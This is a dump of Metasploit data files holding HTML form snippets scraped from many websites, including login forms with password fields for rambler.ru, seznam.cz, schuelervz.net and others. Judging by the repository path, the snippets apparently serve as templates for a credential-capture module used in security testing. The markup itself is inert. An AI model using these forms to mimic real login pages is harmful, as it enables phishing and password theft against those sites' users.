{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/plala.or.jp.txt", "content": "<form action='http://search.goo.ne.jp/web.jsp' method='GET'> <input name=\"from\" type=\"hidden\" value=\"\" /><input name=\"PT\" type=\"hidden\" value=\"\" /><input name=\"IU\" type=\"hidden\" value=\"\" /><input name=\"IE\" type=\"hidden\" value=\"\" /><input name=\"MT\" class=\"search\" type=\"text\" value=\"\" style=\"ime-mode: active;\" /><input name=\"act.search\" type=\"image\" src=\"img/ind_search_submit.gif\" border=\"0\" value=\"\" alt=\"\u0152\u0178\u008d\u00f5\" /><input name=\"STYPE\" checked type=\"radio\" value=\"\" onclick=\"0\" /><input name=\"STYPE\" type=\"radio\" value=\"\" onclick=\"0\" /><input name=\"STYPE\" type=\"radio\" value=\"\" onclick=\"0\" /><input name=\"STYPE\" type=\"radio\" value=\"\" onclick=\"0\" /><input name=\"STYPE\" type=\"radio\" value=\"\" onclick=\"0\" /><input name=\"STYPE\" type=\"radio\" value=\"\" onclick=\"0\" /></form>", "timestamp": "2025-10-24T23:41:14.554295"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/plaxo.com.txt", "content": "<form action='http://pulse.plaxo.com/pulse/search/publicPeopleSearch' method='GET' onsubmit='return validateSearch();'> <input name=\"q\" class=\"text\" type=\"text\" id=\"directoryQuery\" /><input class=\"button\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:14.869802"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/pogo.com.txt", "content": "<form name='search' action='/misc/gamesearch/gamesearch.do' method='post'> <input name=\"pogoword\" class=\"s-search-input\" type=\"text\" id=\"pogoword\" maxlength=\"20\" /><input class=\"s-search-button\" type=\"image\" src=\"/img/gamesearch/en_US/s-btn-search.gif\" onclick=\"submit()\" /></form>", "timestamp": "2025-10-24T23:41:15.207752"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/pornhub.com.txt", "content": "<form class='header_search' action='main.php' method='get'> <input name=\"action\" type=\"hidden\" value=\"\" /><input name=\"search_id\" size=\"30\" type=\"text\" value=\"\" style=\"font-size: 11px; height: 13px;\" /><input class=\"search\" type=\"submit\" value=\"\" style=\"vertical-align: bottom;\" /></form>", "timestamp": "2025-10-24T23:41:15.556833"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/pornotube.com.txt", "content": "<form name='ageverify' action='index.php?' method='post'> <input name=\"submit\" type=\"submit\" value=\"\" style=\"font-size: 1.5em;background-color: #fff;border: 1px solid #fb9b03;color: #fb9b03;\" /><input name=\"verifyAge\" type=\"hidden\" id=\"verifyAge\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:15.885241"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rakuten.co.jp.txt", "content": "<form name='myForm' action='http://rd.rakuten.co.jp/cow/form/' method='get'> <input name=\"sfrom\" type=\"hidden\" value=\"\" /><input name=\"R2\" type=\"hidden\" value=\"\" /><input name=\"D2\" type=\"hidden\" value=\"\" /><input name=\"_dummy\" type=\"hidden\" value=\"\" /><input name=\"sitem\" size=\"35\" type=\"text\" /><input type=\"submit\" value=\"\" /></form><form name='news' action='http://emagazine.rakuten.co.jp/ns' method='post' onsubmit='return subm()'> <input name=\"news0\" type=\"hidden\" value=\"\" /><input name=\"email\" size=\"19\" type=\"text\" value=\"\" onfocus=\"clearEmail()\" style=\"width:180px;\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:16.242547"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rambler.ru.txt", "content": "<form name='Search' action='http://www.rambler.ru/srch' method='get' style='margin-bottom: 0px;'> <input name=\"set\" type=\"hidden\" value=\"\" /><input name=\"words\" tabindex=\"1\" size=\"30\" class=\"input100\" type=\"text\" /><input name=\"btnG\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" type=\"submit\" value=\"\" /></form><form action='http://id.rambler.ru/script/auth.cgi' method='POST'> <input name=\"domain\" type=\"hidden\" value=\"\" /><input name=\"url\" type=\"hidden\" value=\"\" /><input name=\"login\" tabindex=\"2\" size=\"10\" class=\"input100\" type=\"text\" value=\"\" /><input name=\"passw\" tabindex=\"2\" size=\"10\" class=\"input100\" type=\"password\" /><input name=\"long_session\" tabindex=\"2\" type=\"checkbox\" id=\"long_session\" style=\"margin-left: 0px;\" /><input tabindex=\"2\" type=\"submit\" value=\"\" /></form><form name='rad' onsubmit='pppwnew(this.id.value); return false;' target='_blank' style='margin-bottom: 0px;'> <input tabindex=\"3\" title=\"\u00d1\u00eb\u00f3\u00f8\u00e0\u00f2\u00fc\" type=\"Submit\" value=\"\" style=\"font-size:11px; width:100%; height:19px; border: 1px solid #959595; background: #ffffff url('http://images.rambler.ru/head2005/btn_audio.gif') bottom repeat-x; padding: 0 7px 0 7px; cursor:pointer; cursor:hand;\" /></form>", "timestamp": "2025-10-24T23:41:16.544557"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rapidshare.com.txt", "content": "<form name='ul' enctype='multipart/form-data' action='http://rs229l3.rapidshare.com/cgi-bin/upload.cgi?rsuploadid=118201421352464279' method='post' onsubmit='return zeigeProcess();'> <input name=\"filecontent\" size=\"65\" type=\"file\" id=\"dateiname\" onchange=\"zeigeUploadBtn();\" /><input name=\"u\" type=\"image\" src=\"/img2/upload_file.jpg\" id=\"btnupload\" style=\"visibility:hidden;\" /></form>", "timestamp": "2025-10-24T23:41:16.876818"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rapidshare.de.txt", "content": "<form name='ul' enctype='multipart/form-data' action='http://ul8.rapidshare.de/cgi-bin/upload.cgi?rsuploadid=121956019810816478' method='post' onsubmit='document.ul.u.value=Uploading...;document.ul.u.disabled=true'> <input name=\"filecontent\" size=\"64\" type=\"file\" /><input name=\"u\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:17.194532"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rediff.com.txt", "content": "<form name='query' action='http://search1.rediff.com/dirsrch/default.asp' method='get' onsubmit='return submit_Web();'> <input name=\"MT\" type=\"text\" style=\"vertical-align:middle; width:640px;\" /><input class=\"srchgobtn\" title=\"Search\" type=\"submit\" value=\"\" style=\"width:75px;height:22px;vertical-align:middle;\" /></form><form name='pred' action='some.asp' method='post'> </form><form name='get_quote' action='http://portfolio.rediff.com/money/jsp/quote_process_home.jsp' method='post' style='PADDING: 0px; MARGIN: 0px;'> <input name=\"cmpsearch\" type=\"hidden\" value=\"\" /><input name=\"query\" style=\"BORDER-RIGHT: #adadad 1px solid; BORDER-TOP: #adadad 1px solid; FONT-SIZE: 11px; VERTICAL-ALIGN: middle; BORDER-LEFT: #adadad 1px solid; WIDTH: 182px; COLOR: #707070; MARGIN-RIGHT: 2px; BORDER-BOTTOM: #adadad 1px solid; HEIGHT: 22px\" /><input name=\"\" type=\"button\" value=\"\" onclick=\"frmSubmit();\" style=\"BORDER-RIGHT: #98989c 1px solid; BORDER-TOP: #98989c 1px solid; FONT-WEIGHT: bold; FONT-SIZE: 11px; BACKGROUND: #adadad; VERTICAL-ALIGN: middle; BORDER-LEFT: #98989c 1px solid; WIDTH: 70px; CURSOR: hand; COLOR: #ffffff; BORDER-BOTTOM: #98989c 1px solid; HEIGHT: 22px\" /></form><form name='loginform' action='http://mail.rediff.com/cgi-bin/login.cgi' method='post' onsubmit='return chkLogin();'> <input name=\"login\" size=\"6\" type=\"text\" style=\"MARGIN: 0px; WIDTH: 104px; FONT-FAMILY: arial,helvetica,sans-serif\" maxlength=\"30\" /><input name=\"passwd\" size=\"6\" type=\"password\" style=\"MARGIN: 0px; WIDTH: 127px; FONT-FAMILY: arial,helvetica,sans-serif\" /><input name=\"FormName\" type=\"hidden\" value=\"\" /><input class=\"srchgobtn\" title=\"Sign in\" type=\"submit\" value=\"\" style=\"width:37px;height:22px;\" /></form>", "timestamp": "2025-10-24T23:41:17.532061"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/redtube.com.txt", "content": "<form name='searchform' action='http://www.redtube.com'> <input name=\"search\" type=\"text\" value=\"\" style=\"background-color:#0F0F0F; color:#FFFFFF; border:solid 2px #929292; font-weight:bold; font-size:11pt; height:25px; font-family:Arial; line-height:19px; width:100%;\" /></form>", "timestamp": "2025-10-24T23:41:17.857961"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/reference.com.txt", "content": "<form name='search_form' action='/search' method='get' onsubmit='return formcheck();'> <input name=\"q\" class=\"text\" type=\"text\" id=\"search-terms\" value=\"\" maxlength=\"256\" /><input class=\"image\" type=\"image\" src=\"\" alt=\"Search\" /></form>", "timestamp": "2025-10-24T23:41:18.177258"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/repubblica.it.txt", "content": "<form action='repubblica' method='get' id='searchFormAction' accept-charset='iso-8859-1'> <input name=\"query\" onkeypress=\"if(event.keyCode == 13 || event.which == 13 || event.charCode== 13) { checkFormFast('http://ricerca.repubblica.it/','repubblica');return false; };\" type=\"text\" value=\"\" /><input type=\"button\" id=\"searchformbutton\" value=\"\" onclick=\"javascript:checkFormFast('http://ricerca.repubblica.it/','repubblica');\" /></form><form action='#' style='float:left; font-size: 10px;'> </form><form action='#' style='font-size: 10px;'> </form><form name='prog' action='http://www.capital.it/trovacinema/ricerca_film.jsp' method='get' onsubmit='return formvalidation(this)'> <input checked=\"true\" name=\"dove\" class=\"radiob\" type=\"radio\" value=\"\" /><input name=\"dove\" class=\"radiob\" type=\"radio\" value=\"\" /><input name=\"ref\" type=\"hidden\" value=\"\" /><input checked=\"true\" name=\"per\" class=\"radiob\" type=\"radio\" value=\"\" onclick=\"document.prog.film[0].selected=true; document.prog.cinema.value='oppure inserisci un cinema'\" /><input name=\"per\" class=\"radiob\" type=\"radio\" value=\"\" onclick=\"document.prog.film[0].selected=true; document.prog.cinema.value='oppure inserisci un cinema'\" /><input name=\"cinema\" class=\"tcn\" type=\"text\" value=\"\" onfocus=\"this.value=''; document.prog.per[0].checked=false; document.prog.per[1].checked=false; document.prog.film[0].selected=true;\" /></form><form action='#'> </form><form name='borsa' action='http://finanza.repubblica.it/scripts/cligipsw.dll?ref=hpsbdx' method='post'> <input name=\"app\" type=\"hidden\" value=\"\" /><input name=\"tpl\" type=\"hidden\" value=\"\" /><input name=\"crit\" type=\"hidden\" value=\"\" /><input name=\"op\" type=\"hidden\" value=\"\" /><input name=\"ntit_cerca\" type=\"hidden\" value=\"\" /><input name=\"cerca_non_scaduti\" type=\"hidden\" value=\"\" /><input name=\"titmask_cerca\" type=\"hidden\" value=\"\" /><input name=\"frase\" size=\"10\" class=\"borsainput\" type=\"text\" value=\"\" onfocus=\"if(this.value=='Cerca il titolo') this.value='';\" maxlength=\"20\" onblur=\"if(this.value=='') this.value='Cerca il titolo'\" /></form><form action='#'> </form>", "timestamp": "2025-10-24T23:41:18.519499"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/reuters.com.txt", "content": "<form action='/test' method='GET'> <input name=\"searchbox\" size=\"27\" title=\"Search quotes, news,  video, and pictures on Reuters\" onkeypress=\"if(event.keyCode == 13) {doSearchIntegration('searchbox', 'http://search.us.reuters.com/rsearch/rcomSearch.do', 'ussrch-top-quote');return false;}\" type=\"text\" id=\"searchbox\" value=\"\" onfocus=\"clearSearch('Quotes, News, Pictures &amp; Video');\" onblur=\"fillSearch('Quotes, News, Pictures &amp; Video');\" /><input name=\"_ctl24\" class=\"button\" src=\"/resources/images/refreshSearchButton.gif\" type=\"image\" onclick=\"javascript:doSearchIntegration('searchbox', 'http://search.us.reuters.com/rsearch/rcomSearch.do', 'ussrch-top-quote');return false;\" /></form>", "timestamp": "2025-10-24T23:41:18.852875"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rmxads.com.txt", "content": "<form action='index_results.php' onsubmit='return checkForEmptySearchBox(querybox);'> <input name=\"querybox\" size=\"70\" class=\"searchfields\" type=\"text\" value=\"\" /><input name=\"qs\" type=\"hidden\" value=\"\" style=\"display:none\" /><input size=\"50px\" class=\"searchbutton\" type=\"submit\" value=\"\" /></form><form action='index_results.php' onsubmit='return checkForEmptySearchBox(querybox);'> <input name=\"querybox\" size=\"70\" class=\"searchfields\" type=\"text\" value=\"\" /><input name=\"qs\" type=\"hidden\" value=\"\" style=\"display:none\" /><input size=\"50px\" class=\"searchbutton\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:19.169201"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/rude.com.txt", "content": "<form name='content_search' onsubmit='return frm_submit();'> <input name=\"search\" type=\"hidden\" value=\"\" /><input name=\"name\" size=\"25\" class=\"smalltext\" type=\"text\" value=\"\" onclick=\"clear_text(this);\" /><input name=\"searchbutton\" class=\"smalltext\" type=\"button\" value=\"\" onclick=\"frm_submit();\" /></form>", "timestamp": "2025-10-24T23:41:19.469554"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/ryze.com.txt", "content": "<form name='form1' action='loginprocess.php' method='POST'> <input name=\"flogin\" size=\"20\" /><input name=\"fpassword\" size=\"20\" type=\"password\" /><input name=\"fcookie\" type=\"checkbox\" value=\"\" /><input type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:19.773228"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sakura.ne.jp.txt", "content": "<form name='search' action='http://www.sakura.ad.jp/namazu/nmz.cgi' method='get'> <input name=\"Go\" type=\"image\" src=\"/common/images/header-bt-search.gif\" id=\"bt-search\" alt=\"Go\" /><input name=\"query\" type=\"text\" id=\"searchbox\" value=\"\" onfocus=\"InputDefault(this.name,'\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u691c\u7d22','search')\" onblur=\"OutputReturn(this.name,'\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u691c\u7d22','search')\" style=\" size:24;\" /><input name=\"idxname\" type=\"hidden\" value=\"\" /><input name=\"idxname\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:20.121112"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sapo.pt.txt", "content": "<form onsubmit='location.href=http://clientesadsl.sapo.pt;return(false);'> </form><form name='fpesquisa' action='http://pesquisa.sapo.pt/' method='get' id='srcaction' onsubmit='lk(http://pesquisa.sapo.pt/,pesquisa);'> <input name=\"barra\" type=\"hidden\" id=\"srctype\" value=\"\" /><input name=\"st\" type=\"hidden\" id=\"srcst\" value=\"\" /><input name=\"channel\" type=\"hidden\" id=\"srcch\" value=\"\" /><input name=\"q\" type=\"text\" id=\"searchstr\" /></form><form action='#' id='clist' onsubmit='tvChannel();return(false);' method='POST'> <input class=\"btnSubmit\" type=\"submit\" value=\"\" /></form><form action='/' id='formlogin' onsubmit='lk(/login,tools);doLogin();return(false);' method='post' style='display:none'> <input name=\"login\" class=\"txtbox\" type=\"text\" /><input name=\"password\" class=\"txtbox\" type=\"password\" /><input type=\"checkbox\" id=\"loginsess\" /><input class=\"btnSubmit\" type=\"submit\" value=\"\" /><input name=\"loginret\" type=\"hidden\" id=\"idloginret\" value=\"\" /></form><form> <input name=\"pagew\" type=\"radio\" id=\"pagewwide\" onclick=\"s$('prefsave').className='btn';\" /><input name=\"pagew\" type=\"radio\" id=\"pagewnarrow\" onclick=\"s$('prefsave').className='btn';\" /><input name=\"pagew\" type=\"radio\" id=\"pagewauto\" onclick=\"s$('prefsave').className='btn';\" /></form><form id='pnsel'> </form><form id='pdsel'> </form>", "timestamp": "2025-10-24T23:41:20.494586"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/schuelervz.net.txt", "content": "<form action='https://secure.schuelervz.net/Login' id='Login' method='post'> <input name=\"email\" class=\"fieldText\" type=\"text\" id=\"Login_email\" value=\"\" /><input name=\"password\" class=\"fieldText\" type=\"password\" id=\"Login_password\" value=\"\" /><input name=\"login\" class=\"fieldBtnSubmit\" type=\"submit\" value=\"\" /><input name=\"jsEnabled\" type=\"hidden\" id=\"jsEnabled\" value=\"\" /><input name=\"formkey\" type=\"hidden\" value=\"\" /><input name=\"iv\" type=\"hidden\" value=\"\" /><input name=\"checkcode\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:20.825306"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/seesaa.net.txt", "content": "<form name='searchform' action='/pages/search' method='POST'> <input name=\"key_article\" type=\"hidden\" id=\"id_key_article\" value=\"\" /><input name=\"key_photo\" type=\"hidden\" id=\"id_key_photo\" value=\"\" /><input name=\"key_video\" type=\"hidden\" id=\"id_key_video\" value=\"\" /><input name=\"key_audio\" type=\"hidden\" id=\"id_key_audio\" value=\"\" /><input name=\"key_blog\" type=\"hidden\" id=\"id_key_blog\" value=\"\" /><input name=\"key_commodity\" type=\"hidden\" id=\"id_key_commodity\" value=\"\" /><input name=\"tag\" size=\"40\" type=\"text\" value=\"\" /><input type=\"image\" src=\"/img/cmn/m_search_btn.jpg\" border=\"0\" alt=\"\u691c\u7d22\" align=\"absmiddle\" /><input name=\"btnname\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:21.200273"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sendspace.com.txt", "content": "<form name='upload' enctype='multipart/form-data' action='http://fs02u.sendspace.com/processupload.html' method='post' onsubmit='return uploadformsubmit()'> <input name=\"MAX_FILE_SIZE\" type=\"hidden\" value=\"\" /><input name=\"UPLOAD_IDENTIFIER\" type=\"hidden\" value=\"\" /><input name=\"DESTINATION_DIR\" type=\"hidden\" value=\"\" /><input name=\"js_enabled\" type=\"hidden\" id=\"js_enabled\" value=\"\" /><input name=\"file_0\" size=\"35\" type=\"file\" id=\"filebrowse\" /><input name=\"desc0\" type=\"text\" id=\"filedescription\" style=\"width:236px;\" /><input name=\"recpemail\" type=\"text\" id=\"recpemail\" value=\"\" style=\"width:236px;\" /><input name=\"ownemail\" type=\"text\" id=\"ownemail\" value=\"\" style=\"width:236px;\" /><input name=\"terms\" type=\"checkbox\" id=\"terms\" value=\"\" style=\"width:16px; border:none; margin-bottom:0px; margin-left:0px;\" /><input type=\"submit\" id=\"btnupload\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:21.521451"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sexyono.com.txt", "content": "<form action='?PAEBCKW=5988539' method='post'> <input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"puntaje\" type=\"radio\" value=\"\" onclick=\"this.form.submit()\" /><input name=\"filename\" type=\"hidden\" value=\"\" /><input name=\"promedio\" type=\"hidden\" value=\"\" /><input name=\"sexo\" type=\"hidden\" value=\"\" /><input name=\"votos\" type=\"hidden\" value=\"\" /><input name=\"ultimoacceso\" type=\"hidden\" value=\"\" /><input name=\"conoceme\" type=\"hidden\" value=\"\" /><input name=\"orden\" type=\"hidden\" value=\"\" /><input name=\"total\" type=\"hidden\" value=\"\" /><input name=\"red\" type=\"hidden\" value=\"\" /></form><form action='?PAEBCKW=5988539' method='post'> <input name=\"filtro\" type=\"hidden\" value=\"\" /></form><form action='?PAEBCKW=5988539' method='post'> <input name=\"username\" size=\"7\" class=\"user\" /><input name=\"password\" size=\"7\" class=\"user\" type=\"password\" /><input name=\"login\" class=\"user\" type=\"submit\" value=\"\" /><input name=\"uid\" type=\"hidden\" value=\"\" /><input name=\"filename\" type=\"hidden\" value=\"\" /><input name=\"ranking\" type=\"hidden\" value=\"\" /><input name=\"votos\" type=\"hidden\" value=\"\" /><input name=\"sexo\" type=\"hidden\" value=\"\" /><input name=\"ultimoacceso\" type=\"hidden\" value=\"\" /><input name=\"conoceme\" type=\"hidden\" value=\"\" /><input name=\"puntajedado\" type=\"hidden\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:21.836301"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/seznam.cz.txt", "content": "<form action='http://search.seznam.cz/' id='inet-f'> <input name=\"q\" size=\"65\" autocomplete=\"off\" class=\"shadow\" type=\"text\" accesskey=\"4\" id=\"inet-field\" /><input class=\"button\" type=\"submit\" id=\"hledej\" value=\"\" /><input name=\"mod\" checked=\"checked\" type=\"radio\" id=\"cr\" value=\"\" /><input name=\"mod\" type=\"radio\" id=\"world\" value=\"\" /><input name=\"blindFriendly\" type=\"checkbox\" id=\"bf\" value=\"\" /></form><form action='/firmy' id='firms-f'> <input name=\"mod\" type=\"hidden\" value=\"\" /><input name=\"w\" size=\"65\" class=\"shadow\" type=\"text\" id=\"firms-field\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form action='http://www.mapy.cz/searchScreen' method='get' id='maps-f'> <input name=\"query\" size=\"50\" autocomplete=\"off\" class=\"shadow\" type=\"text\" id=\"maps-field\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form action='http://slovnik.seznam.cz/sl.fcgi' method='post' id='dict-f' onsubmit='return sg.action()'> <input name=\"src_trg\" type=\"hidden\" id=\"src_trg\" value=\"\" /><input name=\"word\" size=\"55\" autocomplete=\"off\" class=\"shadow\" type=\"text\" id=\"dict-field\" value=\"\" /><input class=\"button\" type=\"submit\" id=\"czen\" value=\"\" onclick=\"this.form.src_trg.value = 'cz_en'\" /><input class=\"button\" type=\"submit\" id=\"encz\" value=\"\" onclick=\"this.form.src_trg.value = 'en_cz'\" /></form><form action='http://www.zbozi.cz' method='get' id='goods-f'> <input name=\"q\" size=\"55\" autocomplete=\"off\" class=\"shadow\" type=\"text\" id=\"goods-field\" value=\"\" /><input class=\"button\" type=\"submit\" value=\"\" /></form><form action='https://login.seznam.cz/loginProcess' id='login-form' method='post'> <input name=\"loggedURL\" type=\"hidden\" value=\"\" /><input name=\"serviceId\" type=\"hidden\" value=\"\" /><input name=\"forceSSL\" type=\"hidden\" value=\"\" /><input tabindex=\"1\" name=\"username\" size=\"8\" class=\"login\" type=\"text\" id=\"login\" value=\"\" /><input tabindex=\"2\" name=\"password\" size=\"8\" class=\"login\" type=\"password\" id=\"password\" /><input tabindex=\"4\" class=\"sub\" type=\"submit\" value=\"\" /><input name=\"js\" type=\"hidden\" id=\"js\" value=\"\" /><input name=\"remember\" type=\"checkbox\" id=\"remember\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:22.154719"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/shopping.com.txt", "content": "<form action='/xFS' id='frmGSRequest' method='get' onsubmit='return validateInput(this.KW);' target='_top'> <input name=\"KW\" autocomplete=\"off\" class=\"schInput saiHght\" onkeydown=\"return searchSuggestionsKeyDown(event)\" onkeypress=\"return searchSuggestionsKeyPress(event)\" type=\"text\" id=\"searchTxtField\" onkeyup=\"showSearchSuggestions(event, 'saiArea', 'saiIframe', 'sai', encodeURIComponent(this.value), null);\" value=\"\" onclick=\"clickInsideSSD()\" /><input name=\"CLT\" type=\"hidden\" value=\"\" /><input class=\"vMid\" type=\"submit\" value=\"\" /></form><form action='#' id='consumersChoiceForm'> </form><form action='' id='sessionForm' style='display:none;'> </form><form action='/xFS' id='frmGSRequestFoot' method='get' onsubmit='return validateInput(this.KW);' target='_top'> <input name=\"KW\" autocomplete=\"off\" class=\"schInput saiHght\" onkeydown=\"return searchSuggestionsKeyDown(event)\" onkeypress=\"return searchSuggestionsKeyPress(event)\" type=\"text\" onkeyup=\"showSearchSuggestions(event, 'saiAreaFoot', 'saiIframeFoot', 'saiFoot', encodeURIComponent(this.value), null);\" value=\"\" onclick=\"clickInsideSSD()\" /><input name=\"CLT\" type=\"hidden\" value=\"\" /><input class=\"vMid\" type=\"submit\" value=\"\" /></form>", "timestamp": "2025-10-24T23:41:22.488384"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/sify.com.txt", "content": "<form name='frm_searchweb' method='post' onsubmit='Search(1);return false;'> <input name=\"sitesearch\" checked type=\"radio\" value=\"\" /><input name=\"sitesearch\" type=\"radio\" value=\"\" /><input name=\"web_text\" class=\"txt209\" type=\"text\" style=\"height: 22px;\" /><input name=\"Submit2\" type=\"submit\" value=\"\" /></form><form name='frm_DomainReg' method='post' onsubmit='DomainReg();return false;'> <input name=\"txtmand_DomainName\" class=\"txt2\" type=\"text\" value=\"\" onfocus=\"DomainFocus()\" onblur=\"DomainBlur()\" /><input name=\"hid_all_extn\" type=\"hidden\" /><input name=\"hid_sel_extn\" type=\"hidden\" /><input name=\"hidcheck\" type=\"hidden\" value=\"\" /><input name=\"hid_sel_extn\" type=\"hidden\" value=\"\" /><input name=\"ta_domains\" type=\"hidden\" value=\"\" /><input name=\"hid_frompage\" type=\"hidden\" value=\"\" /><input name=\"hid_extn\" type=\"hidden\" value=\"\" /></form><form name='frm_weather' method='POST' onsubmit='javascript: buttonClick();'> <input name=\"hidCity\" type=\"hidden\" /><input name=\"txtbox\" autocomplete=\"off\" class=\"txt2\" type=\"text\" onkeyup=\"javascript:searchvalues(event);\" onfocus=\"javascript: enterFunc(event);\" /></form><form name='search_guest' action='http://shopping.sify.com/shopping/search_results.php' method='post' form='' style='margin-bottom:0;' target='_parent'> <input name=\"keywords\" class=\"txt4\" type=\"text\" value=\"\" /><input name=\"pid\" class=\"txt4\" type=\"hidden\" value=\"\" /><input name=\"Submit\" class=\"arial10\" type=\"submit\" value=\"\" onclick=\"javascript:checkchars();\" /></form><form name='frm_astrodaily'> </form><form name='login' action='http://mail.sify.com/intermediate.php3' method='post' target='_top'> <input name=\"password\" class=\"mail_signup_txt\" type=\"password\" value=\"\" /><input name=\"Submit\" type=\"submit\" value=\"\" onclick=\"javascript:return validate_mail();\" /></form><form name='frm_display' method='post'> <input name=\"SifyId\" type=\"hidden\" value=\"\" /><input name=\"q1ans\" type=\"radio\" id=\"q1ans\" value=\"\" /><input name=\"q1ans\" type=\"radio\" id=\"q1ans\" value=\"\" /><input name=\"q1ans\" type=\"radio\" id=\"q1ans\" value=\"\" /><input name=\"Submit\" type=\"button\" value=\"\" onclick=\"validate()\" /></form>", "timestamp": "2025-10-24T23:41:22.806186"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/skype.com.txt", "content": "<form action='http://search.skype.com/search' id='googleSearchForm' method='get'> <input name=\"q\" type=\"text\" id=\"google-input\" value=\"\" /><input name=\"site\" type=\"hidden\" value=\"\" /><input name=\"client\" type=\"hidden\" value=\"\" /><input name=\"proxystylesheet\" type=\"hidden\" value=\"\" /><input name=\"output\" type=\"hidden\" value=\"\" /></form><form action='/intl/[LC]/' id='userPreferencesForm' method='post'> </form>", "timestamp": "2025-10-24T23:41:23.121052"}
{"source": "github", "repo": "rapid7/metasploit-framework", "file": "data/exploits/capture/http/forms/skyrock.com.txt", "content": "<form action='http://www.skyrock.com/recherche/' id='search_form' method='get' onsubmit='quickSearchBoxCleaner(document.getElementById(quicksearchbox))'> <input name=\"quicksearch\" class=\"txt\" title=\"Search\" type=\"text\" id=\"quicksearchbox\" /><input type=\"submit\" id=\"search_submit\" value=\"\" /></form><form action='http://www.skyrock.com/profil/search.php' method='get'> <input name=\"skynaute_online\" type=\"checkbox\" id=\"skynaute_online\" /><input name=\"skynaute_photo\" checked=\"checked\" type=\"checkbox\" id=\"withphoto\" /><input name=\"skynaute_video\" type=\"checkbox\" id=\"withvideo\" /><input class=\"submit\" type=\"submit\" value=\"\" /></form><form action='/' method='post'> <input tabindex=\"100\" name=\"need_login_form_login\" class=\"inputsmall\" type=\"text\" id=\"login\" value=\"\" /><input tabindex=\"101\" name=\"need_login_form_password\" class=\"inputsmall\" type=\"password\" id=\"password\" value=\"\" /><input tabindex=\"102\" class=\"loginsubmit\" type=\"image\" src=\"\" /></form>", "timestamp": "2025-10-24T23:41:23.459474"}
